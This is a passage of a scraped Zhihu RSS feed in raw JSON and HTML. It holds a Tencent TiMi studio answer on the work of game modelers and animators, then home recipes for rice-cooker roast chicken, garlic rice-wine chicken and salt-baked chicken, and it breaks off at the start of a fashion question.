data-size=\"normal\" data-rawwidth=\"172\" data-rawheight=\"202\" data-watermark=\"original\" data-original-src=\"v2-3c12ff02d187ac388544df05e23197bd\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<hr>\n<h2><b>日常背锅的建模师：</b></h2>\n<p><br></p>\n<p><b>有人会吐槽说建模和原画，</b></p>\n<p><b>就是买家秀和卖家秀的区别，</b></p>\n<p><b>也是导致原画和建模打架的根源。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-59c46bf7141ceca60dba0e831c0a527e_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"220\" data-rawheight=\"220\" data-watermark=\"original\" data-original-src=\"v2-59c46bf7141ceca60dba0e831c0a527e\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真相真不是那么简单！</b></p>\n<p><b>请听听我的狡辩。</b></p>\n<p><br></p>\n<p><b>职能上简单来说，</b></p>\n<p><b>建模师负责根据原画师的2D设计图，</b></p>\n<p><b>精准制作成3D模型，</b></p>\n<p><b>并放在游戏引擎里完成效果调试。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-65285c10dfc408ec007ae1e32f394817_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"409\" data-watermark=\"original\" data-original-src=\"v2-65285c10dfc408ec007ae1e32f394817\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>大家可以想象一下捏黏土，</p>\n<p>没有足够经验的人，</p>\n<p>即使用灵活的双手和工具，</p>\n<p>对着实物参照，</p>\n<p>也很容易把泥塑捏得画风崩坏。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4284c59f59165fdfa5353485b31b4d01_720w.jpg?rss\" data-caption=\"比如有名的“邪神手办”\" data-size=\"normal\" data-rawwidth=\"662\" data-rawheight=\"487\" data-watermark=\"original\" data-original-src=\"v2-4284c59f59165fdfa5353485b31b4d01\" data-watermark-src=\"v2-893daa03596ca823074c4d783ec34990\" data-private-watermark-src=\"v2-85c6d751b65e06f26f04bfbd59512a36\"></p>\n<p>而3D建模大多是在复杂的专业软件上操作</p>\n<p>参照2D平面原画去进行3D立体还原。</p>\n<p><b>由于平面存在角度遮挡和部分视野盲区，</b></p>\n<p><b>也更考验建模师运用自己的空间想象力，</b></p>\n<p><b>或专业的人体和服饰结构知识来补齐</b>。</p>\n<p><br></p>\n<p><b>所以简单来说，建模真的很不简单！！！</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-42aceacdf465bc1bf1f1dd3711ab5aac_720w.jpg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"690\" data-rawheight=\"670\" data-watermark=\"original\" data-original-src=\"v2-42aceacdf465bc1bf1f1dd3711ab5aac\" data-watermark-src=\"v2-a4f72bcb03405dd39807dc809794c323\" data-private-watermark-src=\"v2-97760711a7e3b35d1098c6850a0e9859\"></p>\n<p><b>首先是局外模型的搭建。</b></p>\n<p><b>局外建模是一个由简到繁，又由繁到简的过程。</b></p>\n<p>建模师会先研究原画设计中的身型和结构，</p>\n<p>捏出一个大致轮廓，也称粗模。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5c19445ea03ac64bbce9ecbae356ee01_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1515\" data-rawheight=\"772\" data-watermark=\"original\" data-original-src=\"v2-5c19445ea03ac64bbce9ecbae356ee01\" data-watermark-src=\"v2-529ab8d4f47e37846e094150f35ded55\" data-private-watermark-src=\"v2-44a8cb55e6664a217816529f059aabff\"></p>\n<p>在粗模的基础上，</p>\n<p>建模师继续使用ZBrush等专业工具，</p>\n<p>对粗模精雕细琢，</p>\n<p>打造出一个高面数的模型，</p>\n<p>也即由简到繁。</p>\n<p><br></p>\n<p><b>面数指的是构成模型的面的数量，</b></p>\n<p><b>面数越高，面越小，模型表面就越是光滑细腻。</b></p>\n<p><b>一个高精度模型的面数就可能超过一千万，</b></p>\n<p><b>这会给设备的处理性能带去极大负担。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c2bef30b87bbe19088814e32b10cc8a1_720w.gif?rss\" data-caption=\"高精度模型放大后的面数细节\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-c2bef30b87bbe19088814e32b10cc8a1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>因此，在将模型放入游戏内之前，</p>\n<p><b>建模师要对高精度模型进行一个由繁到简的处理。</b></p>\n<p><b>这一工序也就是烘焙。</b></p>\n<p><br></p>\n<p><b>烘焙时，建模师会调出一个低面数的模型，</b></p>\n<p><b>用于包裹原先的高面数模型，</b></p>\n<p><b>通过软件计算和映射，</b></p>\n<p><b>较低面数的模型也能模拟出高面数的效果，</b></p>\n<p><b>从而减轻手机的性能负担，让画面更加流畅。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-700e68eccd049f9c97bba2d5e9bff14a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-700e68eccd049f9c97bba2d5e9bff14a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>可能部分玩家会认为游戏内建模不够精细，</p>\n<p><b>但在适配手机性能的前提下，</b></p>\n<p><b>烘焙和降低面数其实是必不可少的处理！</b></p>\n<p><br></p>\n<p><b>在对烘焙后的模型进行精修后，</b></p>\n<p><b>建模师会转战专门的贴图软件，</b></p>\n<p>给模型上色，并添加相应的材质效果，</p>\n<p>让模型显得更加完整逼真。</p>\n<p><br></p>\n<p><b>最后是渲染环节。</b></p>\n<p><b>简单来说，</b></p>\n<p><b>渲染就是通过控制模型和场景的灯光氛围，</b></p>\n<p><b>对材质效果进行品质上的进一步提升，</b></p>\n<p>再配合上动画、特效等元素，</p>\n<p>就有了栩栩如生的3D动态角色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bd1a90e7488c0f19fb206ab4e936fc4f_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-bd1a90e7488c0f19fb206ab4e936fc4f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>一般而言，在完整的研发流程中，</b></p>\n<p><b>3D建模花费的时间总是最长的，</b></p>\n<p>再加上打磨细节和加入动态物理PRB材质等优化工序，</p>\n<p>往往需要十几天，</p>\n<p>可见整个流程的漫长繁琐。</p>\n<p><br></p>\n<p><b>因为建模是直接应用在游戏内的物体，</b></p>\n<p><b>还需要搭配动画、特效、程序技术等复杂的开发过程，</b></p>\n<p><b>也就是说，建模除了尽可能还原原画设计，</b></p>\n<p><b>更要考虑实际的应用层面，</b></p>\n<p><b>尤其是在手机上的运行表现，</b></p>\n<p><b>因此不可避免地要做出一些取舍。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3b035a1d9e99336a3721fd71a64b3919_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"591\" data-rawheight=\"284\" data-watermark=\"original\" data-original-src=\"v2-3b035a1d9e99336a3721fd71a64b3919\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>所以，对于“原画师和建模师会不会打架”的难题。</p>\n<p>答案其实是“不会”。</p>\n<p><b>虽然有时原画和建模会为了细节的取舍而激烈讨论，</b></p>\n<p><b>但都是希望能做出更好的呈现效果，</b></p>\n<p><b>正面讨论也有利于解决问题和优化方案。</b></p>\n<p><br></p>\n<p>随着未来研发技术的不断发展，</p>\n<p>比如更好的渲染引擎、更精致的贴图、更真实的光照技术</p>\n<p>原画和建模总会更容易达成共识的吧。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1370bc70cbb9f36a8548f0ea4a1e9c88_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"360\" data-rawheight=\"360\" data-watermark=\"original\" data-original-src=\"v2-1370bc70cbb9f36a8548f0ea4a1e9c88\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<hr>\n<h2><b>日常“变形”的动画师：</b></h2>\n<p><br></p>\n<p><b>亲爱的朋友们，</b></p>\n<p><b>不知你们看过“学了三年动画”系列吗？</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-417db7861370cae51675057deb79f4fa_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"213\" data-rawheight=\"178\" data-watermark=\"original\" data-original-src=\"v2-417db7861370cae51675057deb79f4fa\" data-watermark-src=\"v2-23fa536af29ce8a752be62d86249b771\" data-private-watermark-src=\"v2-2f0630f59e54f5a182e0eefa1ebf80a0\"></p>\n<p><b>写到这里，我的privilege已经尽数体现了。</b></p>\n<p><b>没错，最苦的人是我。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ef9d98020c5808e1add650766889e9d9_720w.gif?rss\" data-caption=\"“学了三年动画”系列，虽然部分是为了搞笑效果，但一定程度上体现了3D动画的不容易  图源：B站MAX-小仙女\" data-size=\"normal\" data-rawwidth=\"784\" data-rawheight=\"378\" data-watermark=\"original\" data-original-src=\"v2-ef9d98020c5808e1add650766889e9d9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>从职能上来说，</b></p>\n<p><b>角色动画师的职责是“赋予角色灵魂”，</b></p>\n<p><b>也就是根据设定</b></p>\n<p><b>设计角色在游戏中的行为动作与表情表演，</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2fb1ed3156aa53375210f3b70aeb7481_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"719\" data-rawheight=\"417\" data-watermark=\"original\" data-original-src=\"v2-2fb1ed3156aa53375210f3b70aeb7481\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>刚完成的建模就像一个木偶，</b></p>\n<p><b>而动画师为木偶赋予骨架和灵活的关节，</b></p>\n<p><b>并通过软件连上看不见的线，</b></p>\n<p><b>用一套动作使木偶变得生动起来。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4c3b4ac775b16f4e5e4dfc3edaec3bb4_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"615\" data-rawheight=\"317\" data-watermark=\"original\" data-original-src=\"v2-4c3b4ac775b16f4e5e4dfc3edaec3bb4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>成套动作的设计是展现角色个性的关键。</b></p>\n<p>因此在设计之初，</p>\n<p>团队成员同样会展开脑暴会议，</p>\n<p>讨论并进行多轮提案，</p>\n<p>而动画师会根据这些提案去制作出多版可视化设计稿，</p>\n<p>也被称为动作示意。</p>\n<p><br></p>\n<p>在动作示意环节，</p>\n<p><b>动画师首先会利用建模师提供的粗模来进行绑定蒙皮，</b></p>\n<p><b>也就是为皮肤模型搭建一个完整的骨架，</b></p>\n<p><b>并将骨架嵌入到皮肤模型里，</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-52627a55e4c3ed72266dc000aec634d0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1429\" data-rawheight=\"771\" data-watermark=\"original\" data-original-src=\"v2-52627a55e4c3ed72266dc000aec634d0\" data-watermark-src=\"v2-b5ec4380fce208c7955918340cd3d7ca\" data-private-watermark-src=\"v2-f882d6bac663d140bad9ffaa2f1603e1\"></p>\n<p><b>经过绑定蒙皮，</b></p>\n<p><b>模型也就有了动起来的可能。</b></p>\n<p>此时的动作示意仍是比较粗糙生硬的，</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6f7c4d2feabe203a23d87fe86646162b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-6f7c4d2feabe203a23d87fe86646162b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>但在经过团队成员投票通过之后，</p>\n<p><b>动画师就会将粗模替换成最终模型，</b></p>\n<p><b>进入更细致的动作打磨环节。</b></p>\n<p><br></p>\n<p>在这一环节，</p>\n<p>动画师先要考虑的是，</p>\n<p>如何让角色的一举一动符合逻辑，</p>\n<p>符合背景故事设定，</p>\n<p><b>因此动画师会配合场景师，</b></p>\n<p><b>为动作构建一个合适的舞台环境，</b></p>\n<p><b>进一步去考虑登场动作的表演细节</b></p>\n<p><b>以及动作衔接的流畅自然</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ce1a3d1ef5fa1c233e6e6f98ea9135a6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-ce1a3d1ef5fa1c233e6e6f98ea9135a6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>所谓动作衔接的流畅自然</b></p>\n<p><b>也就是角色的运动符合人体动力学，</b></p>\n<p><b>不会给人一种违和感，</b></p>\n<p><b>即使是卡通风格，</b></p>\n<p><b>也要结合科学常识进行艺术加工。</b></p>\n<p><br></p>\n<p>比如当一个角色从高空中落地</p>\n<p>如果没有一个自然的身体起伏作为缓冲，</p>\n<p>也显然是不符合常识的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4081201f0bd1a5100987e5d9844ce027_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-4081201f0bd1a5100987e5d9844ce027\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>这些自然生动的细节，</b></p>\n<p><b>都十分考验动画师的阅历和想象力。</b></p>\n<p><br></p>\n<p>遇到专业领域的武术和舞蹈动作，</p>\n<p>动画师也要寻找大量的参考资料，</p>\n<p>在专业软件中不断进行模拟，</p>\n<p>才能编排出一段逼真的动作演绎。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-24de7752fb19a2610d51de7c2c93d578_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"679\" data-rawheight=\"373\" data-watermark=\"original\" data-original-src=\"v2-24de7752fb19a2610d51de7c2c93d578\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>有时，动画师也会借助真人动作捕捉技术，</b></p>\n<p><b>来制作写实风格的动画。</b></p>\n<p><br></p>\n<p>比如“上官婉儿·梁祝”皮肤，</p>\n<p>就邀请了越剧专家进行表演，</p>\n<p>并通过光学动捕，</p>\n<p>将真人动作复刻到皮肤模型上，</p>\n<p><img src=\"https://pic4.zhimg.com/v2-50ab030a995ba6e608ff8980a41d5805_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"679\" data-rawheight=\"373\" data-watermark=\"original\" data-original-src=\"v2-50ab030a995ba6e608ff8980a41d5805\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>除了肢体动作，</b></p>\n<p><b>面部表情对增强感染力同样至关重要。</b></p>\n<p><br></p>\n<p>比如在“程咬金·功夫厨神”的动作中，</p>\n<p>动画师就加入了享受、陶醉、自信等六个表情，</p>\n<p>结合人物浮夸的动作，</p>\n<p>增强表现的真实性和趣味性。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6eef0527064bcba3fa2c57215573f2e0_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"727\" data-rawheight=\"406\" data-watermark=\"original\" data-original-src=\"v2-6eef0527064bcba3fa2c57215573f2e0\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>随着技术的进步与表现技法的迭代</b></p>\n<p><b>动画师也会运用影视化的镜头语言，</b></p>\n<p>比如镜头的推拉摇移，</p>\n<p>场景的分切组接，</p>\n<p><b>从最佳方位来展现模型和动作的美感，</b></p>\n<p><b>增强叙事的沉浸感</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ee1531a5df0cbd362c5be5f08d50f780_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"727\" data-rawheight=\"331\" data-watermark=\"original\" data-original-src=\"v2-ee1531a5df0cbd362c5be5f08d50f780\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>综上，</b></p>\n<p><b>要想成为一名游戏角色动画师，</b></p>\n<p><b>最好需要：</b></p>\n<p>足够的美术素养、</p>\n<p>动画节奏感、</p>\n<p>2D、3D引擎制作经验、</p>\n<p>较强的自学能力、</p>\n<p>表演艺术经验、</p>\n<p>Maya、3dmax、MotionBuilder等软件知识、</p>\n<p>对动捕技术的了解</p>\n<p>......</p>\n<p><br></p>\n<p>不提了，又得去学技术了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-10609283503d273e2ab5df0d83f831d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"205\" data-rawheight=\"234\" data-watermark=\"original\" data-original-src=\"v2-10609283503d273e2ab5df0d83f831d9\" data-watermark-src=\"v2-270f00905e7b9a300020511551b963ed\" data-private-watermark-src=\"v2-2f175bf4aa6e044f8f78c0bc6b40e63a\"></p>\n<p>后续还有关于特效设计师、UI设计师、美宣设计师的故事，</p>\n<p>视反响持续更新！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-97fe54cb99adf840f79b4a1e87eba033_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"219\" data-rawheight=\"211\" data-watermark=\"original\" data-original-src=\"v2-97fe54cb99adf840f79b4a1e87eba033\" data-watermark-src=\"v2-ba681b6a7826e37dbb51666272c392ad\" data-private-watermark-src=\"v2-5595038ecc466fdcf37adbcf3f8f3744\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tian-mei-gong-zuo-shi-21?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">腾讯天美工作室群</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/356482357/answer/2002965423?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">44 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/449240443?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在小型游戏公司做原画有意义吗?</a><br><a href=\"http://www.zhihu.com/question/315849150?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在学场景原画还是学好3D工作稳定了再学场景原画呢？</a><br>\n","link":"http://www.zhihu.com/question/356482357/answer/2002965423?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"整只鸡怎么做比较好吃？","date":"2021-07-17 23:07:08","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-755820b68b087ecde26428e40a305113_l.jpg?source=8673f162\"><span>一餐范，</span><span>公众号：一餐范（食物与人的小美好~）</span>\n<a href=\"https://www.zhihu.com/question/37119245/answer/365192836\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>我用电饭锅烤一只香到骨子里的鸡！</strong></p>\n<p><strong>先祭出一只电饭锅烤鸡</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3f1e90f13968ddd890a27433b9140fc0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我大学有个室友，是个地地道道的老广，他爱吃鸡那真是爱到了骨子里，每天无鸡不欢。</p>\n<p>在吃遍饭堂形形色色各种鸡之后，琢磨出福利了我们 4 年的大招——<strong>电饭锅烤鸡</strong>！</p>\n<figure><img src=\"https://pica.zhimg.com/v2-7546f95419208c1112f4d4d376ef8ead_720w.gif?source=8673f162\" alt=\"\"><figcaption>当年宿管阿姨无数次上门的罪魁祸首</figcaption></figure><p>因为好吃又简单，舍友的这招我沿用至今，还边吃边改良了烤鸡的配方。</p>\n<p>不骄傲地说，今天这电饭锅烤鸡，绝对够格做压轴硬菜。</p>\n<p><strong><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzI1NjkxOTMxOA%3D%3D%26mid%3D2247487590%26idx%3D1%26sn%3Dc36ece359eb02788f532bedc42a138e5%26scene%3D21%23wechat_redirect\" target=\"_blank\" rel=\"nofollow noreferrer\">电饭锅烤鸡</a>食材清单：</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-7d8759eb34e67d7f7300a272c03f35c3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>童半鸡：1 只 姜片：10-15 片</p>\n<p>食用油：少许 蒜头：4-8 块</p>\n<p>料酒：5 勺 葱头：3-5 个</p>\n<p>生抽：5 勺 辣椒：1-2 个</p>\n<p>老抽：2 勺 密封袋：1 个</p>\n<p>香油：1 勺 蜂蜜：少许盐 1 勺</p>\n<p>冰糖：4-6 块</p>\n<p><strong><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzI1NjkxOTMxOA%3D%3D%26mid%3D2247487590%26idx%3D1%26sn%3Dc36ece359eb02788f532bedc42a138e5%26scene%3D21%23wechat_redirect\" target=\"_blank\" rel=\"nofollow noreferrer\">电饭锅烤鸡</a>料理步骤：</strong></p>\n<p>1|童子鸡洗净，用叉子在鸡身扎些洞，以便入味</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-256b2b9a568c9f13cc96556df291f372_720w.jpg?source=8673f162\" alt=\"\"></figure><p>2|准备一个碗，在食用油里加入 5 勺料酒，5 勺生抽，2 勺老抽 1 勺香油，1 勺盐。再加入姜片、蒜头、葱头、少量辣椒搅拌均匀</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1e2253955996b296ff67627c13b96924_720w.jpg?source=8673f162\" alt=\"\"></figure><p>3|塞些葱头、菱片到鸡身里面，再把整只鸡放进密封袋里倒入腌料，密封后放入冰箱冷藏腌制一晚</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-22f223a6e4dde414b3a31032779d9eca_720w.jpg?source=8673f162\" alt=\"\"></figure><p>4|电饭煲内胆涂上食用油，在底部铺上姜片以及蒜头葱结，把腌制好的童子鸡放入锅内，淋入密封袋中 2/3 的腌料</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3c738daebaaad3d71cbf228c05a7fd85_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-b32a7c1f6e3fd293374f2ae4e6940e8a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>5|电饭煲启用“煮饭”模式，煮好后保温状态下焖 10 分钟</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d974522fd0ec533060dc56daa83a6c8a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>6|开盖后稍稍翻身淋入剩下的脆料，放入少量冰糖，并在鸡身涂上蜂蜜，以便烤好后鸡身油亮，继续启用“煮饭”模式，在保温状态下焖煮 15 分钟鸡。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ef81c3607534735a75f714dfc55e0146_720w.gif?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-0344f71811da84b8719416ee5a728d38_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-38e1b959b73d297939c7a53162584746_720w.jpg?source=8673f162\" alt=\"\"></figure><p>7|取出装盘，把锅中剩余的酱料盛在蘸碟中做蘸酱</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-689023eec619493cb1e1f2b4d33f1da2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>越写越饿，接下来准备做米酒鸡、盐焗鸡、麻油鸡、油纸包鸡，想看点赞了啊喂！</p>\n<p><strong>再祭出一只蒜香米酒鸡</strong></p>\n<p><strong>用蒜瓣加米酒，香气在我家绕了三小时。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-63d710ebab463d56155ddc5e83a18f94_720w.jpg?source=8673f162\" alt=\"\"></figure><p>嫩滑的鸡肉吸足了酱汁，很入味。</p>\n<p>就连你以为是配料的蒜瓣，也完全没有辛辣味，香甜下饭。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1c7939ce6a2c4cb361f19c01f4152361_720w.gif?source=8673f162\" alt=\"\"><figcaption>来，吃</figcaption></figure><p><strong>01 食材</strong></p>\n<p>鸡腿肉、姜、豆瓣酱</p>\n<p>蒜瓣、米酒、水、高汤</p>\n<p><strong>02 步骤</strong></p>\n<p>1.鸡腿肉切块，热锅里热油入 5 片姜爆香</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-44949a5bc8e6a5213d6f57288bae6a7a_720w.gif?source=8673f162\" alt=\"\"></figure><p>2.鸡肉沥干水后，入油锅翻炒到表皮金黄后拨到一边，下一勺豆瓣酱，出红油后将鸡肉翻炒均匀，加生抽一勺，盐和糖少许，翻炒均匀</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-37d143eeac46a6c0f317c66a461f3021_720w.gif?source=8673f162\" alt=\"\"></figure><p>3. 倒入蒜瓣，大火翻炒至蒜瓣表面微焦</p>\n<figure><img src=\"https://pica.zhimg.com/v2-247dc960f9877d3a14f35bd0d6d0b6d8_720w.gif?source=8673f162\" alt=\"\"></figure><p>4. 淋 50g 米酒，再倒入高汤或白开水没过鸡肉，调小火盖上锅盖焖至收汁，起锅装盘就 ok</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4f7123c415a3d9946c6790d9b65348bd_720w.gif?source=8673f162\" alt=\"\"></figure><p>好的爱情，是这只蒜香米酒鸡。</p>\n<p>就像米酒和蒜瓣，两者味浓且矛盾，可一煮，都没有了那股子辛辣，味道交融，反而香得热烈。</p>\n<p><strong><strong>古法盐焗鸡也不能活着出去</strong></strong></p>\n<p><strong>做好这只鸡要用 1 斤盐？！</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-da63e3e993e494967ade44ff309aab47_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-84bdfb2de3d4f5975b1fbd3378fb0aed_720w.gif?source=8673f162\" alt=\"\"></figure><p>曾经向粉丝征集过“美食与故事”，让我感到到哭的一个故事没想到主角却是一只鸡。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b36abb9af5a76e91dbf0a0cffa2af943_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>食材清单：</strong></p>\n<p>整鸡、粗盐、砂纸</p>\n<p><strong>料理步骤：</strong></p>\n<p>1.整鸡洗净晾干水分，鸡身用粗盐抹一遍</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-adda591c6e257931c315502adb9f4909_720w.jpg?source=8673f162\" alt=\"\"></figure><p>2.用两张盐焗鸡砂纸，把鸡包起来</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d8250e66e26bc046035152eed686b496_720w.jpg?source=8673f162\" alt=\"\"></figure><p>3.准备一个砂锅，倒入粗盐垫底，放入整鸡</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c24505582a880f899685b6a9a1149c4c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>4.避免鸡肉跟锅壁接触，余下粗盐铺在鸡的上方</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4ff9084bcfe9b9a898b2339535ff6d41_720w.jpg?source=8673f162\" alt=\"\"></figure><p>5.焗鸡，中灾煮 10 分钟后，转小火慢焗 1 小时即可</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-277cd9718fcc3964d34707a6c314ba64_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d63f6240b38738971c9c2fa3ba7031a1_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>下面是让你 100%做好盐焗鸡的小贴士 </strong></p>\n<p><strong>TIP 1</strong><strong>鸡事先要怎么处理？</strong></p>\n<p>请市场卖鸡阿姨帮你把活鸡处理成白白净净的样子。</p>\n<p>拿回家再清洗一遍，然后晾干（或者用厨房纸巾擦干）！这点很关键，会影响鸡皮的香脆口感，不要湿漉漉的就包纸咯。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-11fd5d3b708002fa2f2791ff8ecb826c_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong>TIP 2</strong><strong>包鸡的纸去哪儿找？</strong></p>\n<p>盐焗鸡砂纸可以在某宝买，也可以用烘焙油纸代替。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f6356a38c6a387b45100a6c095b76ce8_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong>TIP 3</strong><strong>要用多少盐？</strong></p>\n<p>焗鸡的盐得用粗盐，腌咸菜一粒粒的那种。一只大小适中的鸡一包半盐绰绰有余，熟练的话一包就够啦。</p>\n<p>记得不要让鸡和纸直接接触到锅壁，可以拿盐垫在鸡与锅壁之间。</p>\n<p><strong>TIP 4</strong><strong>姜葱蘸料怎么做？</strong></p>\n<p>切姜末和葱白，撒点盐混合在一起。然后锅中热花生油，等油滚后直接淋上去，搅拌均匀就可以了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/37119245\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738206"},{"title":"看到很多微博博主都在推荐基本款，可是基本款穿在普通人身上真的好看吗？","date":"2021-07-17 23:07:03","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-606ca0c3ffb638b165fa3e982a7993c5_l.jpg?source=8673f162\"><span>Pan 